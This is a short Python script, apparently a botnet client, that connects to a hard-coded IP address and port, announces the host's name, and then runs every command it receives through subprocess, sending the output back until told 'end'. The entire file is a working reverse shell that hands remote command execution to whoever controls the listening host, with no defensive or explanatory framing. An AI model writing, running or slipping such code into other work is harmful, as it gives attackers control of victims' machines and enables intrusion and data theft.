import socket
import subprocess

def botclient():

    HOST = '192.168.100.152'
    PORT = 8000

    s = socket.socket()
    s.connect((HOST, PORT))

    message = 'Connection from '+socket.gethostname()
    s.send(message.encode())
    data = s.recv(1024).decode()
    
    while data != 'end':
        if (data):
            try:
                message = subprocess.run(data.split(' '), stdout=subprocess.PIPE)
                s.send(message.stdout)
            except Exception as e:
                print('Error processing'.format(data))
                print(e)
        data = s.recv(1024).decode()
    s.close()

if __name__ == '__main__':
    botclient()